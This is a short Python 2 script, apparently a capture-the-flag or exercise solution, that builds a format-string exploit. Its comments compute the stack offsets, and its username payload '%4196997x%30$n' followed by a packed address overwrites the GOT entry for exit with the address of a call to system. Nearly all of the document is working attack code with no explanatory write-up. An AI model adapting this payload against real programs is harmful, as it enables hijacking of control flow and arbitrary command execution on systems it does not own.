import struct

# call to system  0x400a85
# 4196997      == int(0x400a85)
# $rbp-0x70    == username
# $rbp-0x70    == 0x7fffffffea90
# $sp          == 0x7fffffffe9e0
# diff         == 176  (0xb0)
# num n        == 22 = 176 / 8

# diff  22
# regs  6
# fmt   2
# ==    30
fmt = "%4196997x%30$n  "

# GoT exit
got_exit = struct.pack("<q", 0x00601228)

#fmt needs to be before got_exit to avoid zero
user = fmt + got_exit
password = "whatever"

print user + password
